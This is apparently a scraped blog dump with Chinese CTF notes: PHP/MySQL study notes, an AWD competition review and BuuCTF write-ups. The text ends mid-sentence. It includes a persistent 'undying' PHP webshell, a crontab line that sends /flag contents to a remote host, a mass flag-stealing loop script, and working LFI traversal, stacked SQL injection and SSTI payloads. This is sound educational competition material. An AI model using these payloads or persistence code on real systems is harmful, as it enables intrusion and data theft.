灵活的使用标记当程序中需要大段的打印html代码时, 可以使用如下的方法12345&lt;?php if()&#123;...&#125; else&#123; ?&gt; html... &lt;?php &#125; 常量和静态方法常量用const定义, 静态方法用static修饰, 可以在未初始化前调用 魔术方法12345678910// 方法重载__call($method, $p)// 访问不可访问方法时, since php5.3__callStatic()// 实例化还没有被声明的类时可以调用__autoload()// ex:function __autoload($name)&#123; include_once $name.\".php\";&#125; 迭代器和生成器名称空间如果在文件中声明名称空间, 文件的第一行代码必须是名称空间声明 当没有指定完整的名称空间时, 都会认为在当前名称空间, 如果找不到则会在全局名称空间中寻找, 全局名称空间为\\ 123456// 声明名称空间namespace bob\\html\\page;//使用名称空间use bob\\html\\page;// 别名use bob\\html\\page as www; 第七章 错误和异常处理抛出异常在php中, 异常必须手动抛出 1throw new Exception($message, $code); 注意如果异常没有匹配到catch块将报Error 异常类Exception getCode(): 返回错误代码 getMessage(): 返回错误信息 getFile(): 返回产生异常的文件完整路径 getLine(): 返回错误代码行号 getTrace(): 返回异常代码回溯路径的数组 getTraceAsString(): 返回回溯路径数组的格式化形式 __toString(): string输出异常 1234567891011121314&lt;?phpclass myException extends Exception&#123; function __toString()&#123; return \"&lt;strong&gt;\".$this-&gt;getMessage().\"&lt;/strong&gt;\"; &#125;&#125;try&#123; throw new myException(\"error\");&#125;catch(myException $m)&#123; echo $m;&#125;catch(Exception $m)&#123; echo $m;&#125;?&gt; 第八章 web数据库设计避免保存冗余数据, 当冗余数据过多会出现修改, 插入和删除异常 避免出现大量空值 第九章 Web数据库创建安装步骤 安装文件 如果需要, 创建并设置MySQL的运行用户 设置路径 如果需要, 运行mysql_install_db 设置root用户密码 删除匿名用户和测试数据库 启动MySQL并设置为自动运行 大小写sql语句不区分大小写, 数据库名称和表名称区分大小写(linux下) 创建用户创建用户可以使用 1create user user_info identified by password; 或者使用grant自动创建用户 12-- since mysql 5.5.7grant privileges on item to user_info identified by password; 权限大部分情况下, php脚本只需要select, insert, update, delete操作 可以通过grant授予和revoke取回, 部分权限如file具有极大的安全问题 如果所运行的grant语句已经执行, 但是尝试登陆时被拒绝, 通常是因为安装中的匿名用户没有被删除 查看数据库1234-- 查看所有数据库show databases;-- 显示数据库结构describe database_name; 部分类型当读取char类型或者写入varchar数据时, mysql将过去结尾处多余的空格 blob, 二进制大对象, 可以用来存储图像声音数据等","link":"/2019/11/24/php和mysql开发笔记/"},{"title":"Xman结营赛AWD总结","text":"Xman20天结束了, 感谢各路大佬抬我一手, 第二次打AWD, 虽然还是很菜, 但总不至于毫无输出了, 膜一波@q4n和@Cosmos, 由于总结的时候已经过去两天了, 当时的图都没留下来, 很多地方大家就意会一下吧我还是觉得这个赛制很神奇, 竟然有可以打自己出的题的比赛 准备还是太浪了, 结营赛前一天才开始准备, 本来想上@王一航师傅的框架 AWD Framework , 但是准备的比较晚没搞懂, 就还是上网找了散装脚本用了, 后面会把用到的脚本罗列一下 比赛前一晚还搭好了hackmd, 但是没有整明白虚拟机的网络配置..只能我自己连上去, 导致比赛的过程交流都是物理交流了hhhh 文件交流1234# python2python -m SimpleHTTPServer 8000# python3python -m http.server 8000 文档交流推荐使用codimd 搭建方法参考 https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment 装好了docker和docker-compose只需要三行命令 123git clone https://github.com/hackmdio/docker-hackmd.gitcd docker-hackmddocker-compose up 然后访问localhost:3000即可 图片上传的部分需要进去docker里面修改一下, 默认是imgur图床 1234567# 进入容器, 需要对应containeriddocker exec -it containerid /bin/bash# 安装vimapt update &amp;&amp; apt install vim# 修改vim config.json#修改imageuploadtype为filesystem 然后就可以正常传图片了 虚拟机的网络设置需要改成桥接模式, 这样才能和主机在同一个段, 局域网内可以正常访问 比赛登录比赛开始的时候发了账号密码, 登录上去一直看不到赛题信息, 还以为是网络问题, 后面问了才发现是广告插件的问题 , 关闭广告插件就可以看到了 关闭广告拦截插件 然后下载赛题信息, 里面有ip和ssh的公私钥 第一次连, 差点不会连, 还好MobaXTerm的界面设计的不错, 一眼就看到了在哪里添加 输入host和username(这里是xman) 勾选 Use private Key 选择不带后缀的私钥 id_rsa 然后就可以登录上去了 弱密码这里主要涉及的是 ssh密码 mysql密码 phpmyadmin密码 etc 不过这部分暂时还没找到相关的脚本, 师傅们有的话可以来交流一下 ssh先登录上去, 之后 1passwd 输入密码即可, 改完自己的直接开始打 这里可以用@p0desta师傅的框架 awd-attack 不过没有集成修改ssh密码的功能, 后面再自己改一下吧 数据库12mysql&gt;set password=password(&apos;new&apos;);mysql&gt;flush privileges; 没改的话上去就可以删库跑路了hhh 备份备份还是大意了, 比赛前想过备份数据库, 连命令都准备好了, 结果上去就忘记了, 导致web9从开始就宕机宕到结束 (自己背锅 下面的备份都是备份到家目录 源码备份这里有个注意的点是, 如果不先进入html文件夹的话, 备份后的压缩包会包含整个路径 12# 不建议tar -zcvf ~/html.tar.gz /var/www/html/ 下面的命令压缩后结构如下 12cd /var/www/htmltar -zcvf ~/html.tar.gz * 如果需要恢复则可以使用下面的命令 12rm -rf /var/www/htmltar -zxvf ~/html.tar.gz -C /var/www/html 或者 123cd /var/www/htmlrm -rf *tar -zxvf ~/html.tar.gz 数据库备份先在html文件夹里面搜索一下数据库的用户名和密码 12cd /var/www/htmlfind .|xargs grep &quot;password&quot; , 然后开始备份 12345678#mysql终端下可以先看一下有什么数据库mysql&gt;show databases;# 备份相应的数据库mysqldump -u 用户名 -p 数据库名&gt;~/back.sql# 备份全部数据库mysqldump -u root -p --all-databases &gt;~/back.sql# 跳过锁定的数据库表mysqldump -u root -p --all-databases —skip-lock-tables &gt;~/back.sql 恢复的话, 需要先建好相应的数据库 1234cd mysql&gt;create database xxx;mysql&gt;use xxx;mysql&gt;source back.sql; 或者在终端下 12cdmysql -u root -p xxx&lt;back.sql 上wafwaf, 也就是通用防御, 可以用的一般有下面两种 流量监控, 必上 文件监控, 看情况 至于其他的骚套路, 像流量转发, iptables等等这些有一定的风险, 可能会被举报, 不建议 流量监控重要, 必须上, 流量相当于我们的眼睛, 没有流量只能被动挨打, 有了流量才可以抄作业hhhh 这里贴一下@郁离歌师傅的waf 不过这次结营赛官方提供了pcap流量包, 后面会提到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phperror_reporting(0); define(‘LOG_FILEDIR’,’/tmp’); function waf() &#123; if (!function_exists(‘getallheaders’)) &#123; function getallheaders() &#123; foreach ($_SERVER as $name =&gt; $value) &#123; if (substr($name, 0, 5) == ‘HTTP_’) $headers[str_replace(‘ ‘, ‘-‘, ucwords(strtolower(str_replace(‘_’, ‘ ‘, substr($name, 5)))))] = $value; &#125; return $headers; &#125; &#125; $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER[“REMOTE_ADDR”]; $method = $_SERVER[‘REQUEST_METHOD’]; $filepath = $_SERVER[“SCRIPT_NAME”]; foreach ($_FILES as $key =&gt; $value) &#123; $files[$key][‘content’] = file_get_contents($_FILES[$key][‘tmp_name’]); file_put_contents($_FILES[$key][‘tmp_name’], “virink”); &#125;unset($header[‘Accept’]);$input = array(“Get”=&gt;$get, “Post”=&gt;$post, “Cookie”=&gt;$cookie, “File”=&gt;$files, “Header”=&gt;$header);logging($input);&#125;function logging($var)&#123; $filename = $_SERVER[‘REMOTE_ADDR’];$LOG_FILENAME = LOG_FILEDIR.”/”.$filename;$time = date(“Y-m-d G:i:s”);file_put_contents($LOG_FILENAME, “\\r\\n”.$time.”\\r\\n”.print_r($var, true), FILE_APPEND); file_put_contents($LOG_FILENAME,”\\r\\n”.’http://’.$_SERVER[‘HTTP_HOST’].$_SERVER[‘PHP_SELF’].’?’.$_SERVER[‘QUERY_STRING’], FILE_APPEND);file_put_contents($LOG_FILENAME,”\\r\\n***************************************************************”,FILE_APPEND);&#125;waf(); ?&gt; 自动上waf的脚本, 这个脚本需要注意的是, waf的路径必须是绝对路径, 因为是递归添加waf, 如果不是绝对路径, 内层文件夹的php文件无法找到waf的路径, 服务就会宕掉, 但是如果全部上的话, 就算上对了还是有可能出现宕机, 这个与namespace有关, 可以了解一下, 如果是常见的cms可以上在入口的php中, 就能监听到流量了 1234567891011121314151617181920212223242526272829#-*- coding:utf-8 -*'''批量添加WAF的python脚本'''import osbase_dir = '/var/www/html' #web pathdef scandir(startdir) : os.chdir(startdir) for obj in os.listdir(os.curdir) : path = os.getcwd() + os.sep + obj if os.path.isfile(path) and '.php' in obj and 'log' not in path: modifyip(path,'&lt;?php','&lt;?php\\nrequire_once(\\'/var/www/html/log.php\\');') if os.path.isdir(obj) : scandir(obj) os.chdir(os.pardir) def modifyip(tfile,sstr,rstr): try: lines=open(tfile,'r').readlines() flen=len(lines)-1 for i in range(flen): if sstr in lines[i]: lines[i]=lines[i].replace(sstr,rstr) open(tfile,'w').writelines(lines) except Exception,e: print e scandir(base_dir) 文件监控这个的话要看情况, 如果check会检查是否能正常上传文件的话, 这个一上就宕机, 但是有时候check没有检查的话, 就可以上一下, 避免被写马 主要使用的时候修改里面的Special_string字段 然后在自己修改文件的时候只需要在里面加入这个字段即可, 例如 1234vi index.php....# cjM00N... 这样就可以绕过文件监控了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174# -*- coding: utf-8 -*-#use: python file_check.py ./ import osimport hashlibimport shutilimport ntpathimport time CWD = os.getcwd()FILE_MD5_DICT = &#123;&#125; # 文件MD5字典ORIGIN_FILE_LIST = [] # 特殊文件路径字符串Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN' Special_string = 'cjM00N' # 免死金牌UNICODE_ENCODING = \"utf-8\"INVALID_UNICODE_CHAR_FORMAT = r\"\\?%02x\" # 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123; 'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)), 'log' : os.path.realpath(os.path.join(spec_base_path, logstring)), 'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)), 'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125; def isListLike(value): return isinstance(value, (list, tuple, set)) # 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + \"\".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=\"ignore\") # 目录创建def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise # 获取当前所有文件路径def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist # 计算机文件MD5值def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : ' + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass # 获取所有文件MD5def getfilemd5dict(filelist = []): filemd5dict = &#123;&#125; for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict # 备份所有文件def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path['bak']) if __name__ == '__main__': print u'---------start------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] webshell find : ' + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) pass time.sleep(2) # print '[*] ' + getUnicode(time.ctime()) 扫后门题目备份后拉下来用D盾扫一下后门, 一般来说awd都会预留一个后门, 让比赛快速推进 直接把文件夹丢进去就可以了 很明显就能看到有后门, 先删自己的, 再看看能不能利用打一波 流量分析wireshark这次比赛提供了pcap流量包, 不会用wireshark看的头疼, 比赛都是直接记事本打开看….后面去学习了一下 首先分析一下这次的网络拓扑 假设队伍id为1, 则队伍的选手在 110.10.1.1-10 题目则在 110.10.1.21-30 其他队伍类似, 只是id不同 首先打开wireshark,如图, 下面介绍几种过滤, 不同过滤之间使用and连接 协议可以看到protocol协议有http和tcp两种, tcp都是握手包, 我们可以先筛选出http包, 过滤器中输入 1http 长度一般来说长度较长的可能是关键的流量, 点击length按长度排序 当然这里就是另外一种情况了, 长的全都是垃圾流量hhhh http方式可以过滤 get和post两种, 优先可以考虑post 1http.request.method==&quot;POST&quot; ip如果觉得某个ip一直访问或者每隔一段时间就访问一次, 这种很有可能就是exp访问, 这就需要过滤ip来看一下他的流量了 1ip.src == 10.10.1.14 其他的ip过滤如下 1234# 源ip和目的ipip.addr == 10.10.1.14# 目的ipip.dst == 10.10.1.14 端口用的不多, 命令如下 123456# 源端口和目的端口tcp.port == 80# 源端口tcp.srcport == 80# 目的端口tcp.dstport == 80 mac也比较少用 1eth.addr == 20:dc:e6:f3:78:cc 追踪数据流如果怀疑某个包有问题, 可以右键追踪数据流 直接搜索字段在分组字节流搜索字符串, 说不定有奇效(图中就是有效流量 log记录如果不会看wireshark(比如我)或者是不提供流量包的比赛, 就需要自己上waf去监控了, 抓取的流量如下 后面就是分析流量了, 有个需要注意的点是, 建议在抓取流量的时候, 按时间分流量包, 比如10分钟一个文件, 这样流量不会太大, 加载起来也快, 读起来也方便 如果遇到垃圾流量多的时候一个文件就很难顶了 快速攻击快速攻击主要利用的是burpsuite和它的一个插件 这个插件可以快速的把burp抓到的包转换成代码, 一般为python, 使用的是request库 使用如下, 在包内右键, 然后选择 1Generate Script 就会出现转换的代码了, 直接复制后改一下就可以打了 对于扫出来的后门或者流量分析出来的payload都可以这样用burp快速复现并直接生成代码去打 全场攻击以其中一个脚本为例, 首先使用上面提到的插件生成代码后粘贴进来, 然后根据题目分布, 写个for循环打一遍, 再利用while True让程序死循环跑, 如果某个ip已经不可以打的话就将其加到ban列表里面, 然后每轮输出一共打了几个, 再sleep(300), 也就是5分钟, 比赛是一轮10分钟, 一轮打两次避免特殊情况(如打的时候突然宕机等等) 1234567891011121314151617181920212223242526272829import requestsfrom time import sleepsession = requests.Session()ban = []while True: num = 0 for i in range(11): if i in ban: continue url = \"http://10.10.%d.30/index.php\" % i #print url paramsGet = &#123;\"a\":\"show_pic\",\"c\":\"index\",\"file\":\"/flag\"&#125; headers = &#123;\"Cache-Control\":\"no-cache\",\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36\",\"Connection\":\"close\",\"Pragma\":\"no-cache\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\"&#125; try: response = session.get(url, params=paramsGet, headers=headers, timeout=1).content.strip() if len(response) &gt; 20: r2 = requests.post('http://10.66.66.66/api/v1/ad/web/submit_flag/?event_id=1',data=&#123;\"flag\": response,\"token\":\"dzVaFmggB2WXHDjwMGug8uXi7TTRBEBNxZxHGCngJskgm\"&#125;) print r2.text if \"success\" in r2.text: num += 1 #print(response) else: if i not in ban: ban.append(i) sleep(1) except: pass print num sleep(300) 不过这个写的还是比较糙的, 没有什么参考价值, 大家看一看就好 不死马与杀马一般不死马大概长这样 1234567891011121314&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.conifg.php'; $shell = \"&lt;?php echo system(\"curl 10.0.0.2\"); ?&gt;\"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; 里面有几个点, 首先是文件名, 在linux下面有两种文件名开头比较特别 .开头, 这种文件在linux下为隐藏文件, 直接ls看不到, 需要用ls -all 或者ll才能看到 -开头, 会被linux命令识别为参数, 删除会出错 这里可以使用命令如下 1234rm ./-config.phprm -- -config.php# 如果只有一个文件rm -rf * 然后就是马的主体部分, 死循环不断生成文件, 单纯删掉文件没有用, 还是会生成, 而且此时php文件已经写到内存里面了, 我们可以这么杀马 12345rm .config.php &amp;&amp; mkdir .config.phpkillall -9 apache2# 或者killall -9 -u www-datarm -rf .config.php 通过新建文件夹让程序无法继续写马, 然后再杀掉进程, 删了文件夹就可以了 这只是最基础的内存马, 还有各种花哨的马, 比如几个马相互守护, 定时任务马等等, 删除的方法都差不多, 无非都是想办法杀进程建文件夹来让马失效, 还听说过区块链马, 可以让中马的机器变成一群肉机, 利用他们来进行攻击等等. 定时任务定时任务的语法可以参考https://www.runoob.com/linux/linux-comm-crontab.html 大体就是前面分别表示 分 时 日 月 年 , /后表示每多久执行一次,例如下面的命令就是每十分钟执行一次 1*/10 * * * * command 123456# listcrontab -l# 删除crontab -r# submit flagecho &quot;*/10 * * * * curl ip:port/submit_flag/ -d &apos;flag=&apos;$(/bin/cat /flag)&apos;&amp;token=xxxx&apos;&quot; |crontab 比赛中可以用来写crontab定时getflag, 删除则是crontab -r, 如果是循环写入的, 就得写个循环删, 或者先杀马再删, 一般来说都是结合不死马一起打的组合拳 总结这次比赛准备还是不足, 罗列一下大概如下 没有使用框架, 只是简单的cat /flag , 不能持续输出, 如果别人补了洞就打不了 没有准备好垃圾流量脚本, payload赤裸裸的打出去, 别人抄作业也抄的快, 打了几轮得分就慢慢变少了 备份不够熟练, 原来的备份命令写的有点问题, 导致备份有点慢, 也忘记备份数据库了, 有一道题全程宕机 check写的不好, 只是简单的检查了一下页面, 没有检查页面的内容和数据库的状态, 对选择的cms不熟, 有个洞的exp一直打不出去 总体来说也还好, 队友@Cosmos把自己出的题打了3k分, 权限维持做的不错, 基本从早打到晚, 不过中间好像脚本出了问题, 有一段时间flag打了没交上去, 导致中间没得分, 还是比较亏的, 我抄了几波作业也打的挺快乐 @q4n师傅一个人运维6道pwn题还打了不少输出, 必须膜一波 Xman结束, 接下来就是回归Kap0k了, 希望大三这一年, 能像@C0mRaDe大哥一样做一个真正的web手 最后, 感谢Tea deliverer的@王郁师傅做的AWD分享, 收获很大, 衷心感谢. 参考链接edward- ctf线下赛经验总结 zeroyu-ctf awd模式攻防note 1cePeak-CTF-线下AWD-py脚本 LiN3ver5ec-聊聊AWD攻防赛流程及准备经验","link":"/2019/08/22/Xman结营赛AWD总结/"},{"title":"BuuCTF刷题记录","text":"感谢glzjin师傅 [HCTF 2018]WarmUp这是CISCN2019华南赛区半决赛的题目…当时没做出来 太菜了 题目源自 CVE-2018-12613 源码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 这里可以看到, 有is_string的判断, 数组绕过是不可行的, 只能绕过checkFile, 而checkFile里面有二次urldecode, 这给我们提供了机会, 如果我传一个 1?file=source.php%253f 其中%253f是?的二次编码, 这样既可绕过前面的检测, 那么接下来就是使用目录穿越了 先访问hint.php, 可以看到 1flag not here, and flag in ffffllllaaaagggg 这里有个知识点是, 当二重编码时, 这里的source.php相当于一个目录, 也就是说我们位于 12location: /var/www/html/source.php/flag: /ffffllllaaaagggg 所以4次目录穿越, payload如下 1?file=source.php%253f/../../../../ffffllllaaaagggg 或者不用判断多少直接多来几个/../也可以 最终payload 1?file=source.php%253f/../../../../ffffllllaaaagggg [强网杯 2019]随便注解题一fuzz之后发现过滤了select 上网找找有没有能绕过select的方法, 查到了堆叠过滤, 简单测一下, 我们先输入一个复合语句 11&apos;;show tables; 可以看到输出正常, 说明后端的实现应该是 1mysqli_multi_query($sql); 而平时的实现是mysql_query这样的语句可以支持多条sql语句同时执行, 那要绕过select的过滤的话可以使用 1set @t=0xaaaaa;prepare x from @t;execute x; 预编译语句来执行, 其中@t的部分是执行语句的hex编码, 例如我们要执行 1select * from `1919810931114514`; hex编码后替换上面的aaaaa即可 解题二这里其实已经有了一个select, 那我们如果利用这个来查询的话就可以直接查询flag了 先查看一下两个表的结构, 表名我们前面已经查出来了 11&apos;;show columns from words; 有两个列, 一个是id另一个是data, 明显id就是查询的索引, 所以先重命名两个表 1RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# 可以给表增加一个id列或者直接将flag列改成id列, 然后万能密码 11&apos; or 1=1# 查出flag GetFlag最终payload如下 11&apos;;Set @t=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare x from @t; Execute x; [强网杯 2019]高明的黑客强网杯的题目, 拉下来有3001个混淆过的php, 随便打开后可以看到有输出 回来看一下源码, 可以看到有许多get或者post的参数, 并且有eval, system, assert等系统函数, 但是大部分都赋值或者无法使用 当时比赛的时候还傻乎乎的用phpstorm去一行行跟过, 这题主要考察的是fuzz的想法, 通过对这些文件进行fuzz来查找可以使用的参数, 首先需要启动php服务, 在win下我们使用phpstudy直接开就可以了, linux下直接 1php -S 0:8080 即可访问, 然后是通过正则去匹配传入的参数名 1(?&lt;=_GET\\[\\&apos;).*(?=\\&apos;\\]) # POST同理 这里不能写成 1(?&lt;=_(GET|POST)\\[\\&apos;).*(?=\\&apos;\\]) 否则会报错 查找一下, 网上的说法是 1Python lookbehinds really need to be fixed-width 也就是不能存在不确定宽度的内容, 所以我们需要将post和get分开, 这里有个技巧就是先收集所有的post和get参数同时发送, 如果在内容中检查到我们需要的信息, 再对当前文件的参数进行逐个fuzz, 这样可以节约很多http的开销, 单线程脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport osimport refrom arrow import nowurl = \"http://localhost/src/\"work_dir = \"C:\\phpStudy\\PHPTutorial\\WWW\\src\\\\\"filename = os.listdir(work_dir)patternGet = re.compile(\"(?&lt;=_GET\\[\\').*(?=\\'\\])\")patternPOST = re.compile(\"(?&lt;=_POST\\[\\').*(?=\\'\\])\")print(\"[*] start fuzzing....\")print(now().format())for i in filename: try: content = open(work_dir + i, \"r\", encoding=\"utf-8\").read() param1 = patternGet.findall(content) paramGet = &#123;&#125; for j in list(set(param1)): paramGet[j] = \"echo(cjm00n);\" param2 = patternPOST.findall(content) paramPOST = &#123;&#125; for j in list(set(param2)): paramPOST[j] = \"echo(cjm00n);\" # print(\"[.] %s\" % (i)) res = requests.post(url + i, params=paramGet, data=paramPOST).text if \"cjm00n\" in res: print(\"[*] find at %s\" % (i)) for j in param1: res = requests.get(url + i, params=&#123;j:paramGet[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) for j in param2: res = requests.post(url + i, data=&#123;j:paramPOST[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) except Exception as e: print(e)print(\"[*] done\") 多线程脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import osimport reimport requestsfrom arrow import nowfrom multiprocessing.pool import ThreadPoolurl = \"http://localhost/src/\"work_dir = \"C:\\phpStudy\\PHPTutorial\\WWW\\src\\\\\"patternGet = re.compile(\"(?&lt;=_GET\\[\\').*(?=\\'\\])\")patternPOST = re.compile(\"(?&lt;=_POST\\[\\').*(?=\\'\\])\")def fuzz(i): try: content = open(work_dir + i, \"r\", encoding=\"utf-8\").read() param1 = patternGet.findall(content) paramGet = &#123;&#125; for j in list(set(param1)): paramGet[j] = \"echo(cjm00n);\" param2 = patternPOST.findall(content) paramPOST = &#123;&#125; for j in list(set(param2)): paramPOST[j] = \"echo(cjm00n);\" # print(\"[.] %s\" % (i)) res = requests.post(url + i, params=paramGet, data=paramPOST).text if \"cjm00n\" in res: print(\"[*] find at %s\" % (i)) for j in param1: res = requests.get(url + i, params=&#123;j:paramGet[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) for j in param2: res = requests.post(url + i, data=&#123;j:paramPOST[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) except Exception as e: print(e)if __name__ == \"__main__\": filename = os.listdir(work_dir) print(\"[*] start fuzzing....\") print(now().format()) pool = ThreadPool(20) for i in filename: pool.apply_async(fuzz, (i, )) pool.close() pool.join() [护网杯 2018]easy_tornado打开后可以看到有3个文件, 整理一下文件的信息如下 123456/flag.txtflag in /fllllllllllllag/welcome.txtrender/hints.txtmd5(cookie_secret+md5(filename)) 同时可以观察到url 1http://8054a022-951c-4d19-bc64-c61811d345b4.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=3a8e112bdc5efa665da8d5d7df15d1e8 根据文件名和url, 我们猜测是验证filehash后, 打开了对应的文件并将内容显示到网页中, 而filehash的计算公式中还需要一个cookie_secret, 随便改一下filename, 有个错误页面 python中经常出现404页面的SSTI, 这里的msg就是可以注入的参数, 一般来说, Flask的注入可以执行很多系统命令, 但是其他的模板如Django只能获取一些系统的变量等等, 在tornado中有个很方便的对象handler, 参考 https://www.cnblogs.com/bwangel23/p/4858870.html, 它指向了RequestHandler, 可以用来获取Web Application的setting, 例如我们需要的cookie_secret一般就是在Application的setting里面, 这里使用 1error?msg=&#123;&#123;handler.settings&#125;&#125; 然后md5 1234&lt;?php $filename = \"/fllllllllllllag\"; $cookie_secret = \"a98fc479-624b-45a6-9b84-5c9b4caa2234\"; echo md5($cookie_secret.md5($filename)); 带上参数访问即可 [SUCTF 2019]Pythonginx首先看到源码 123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host 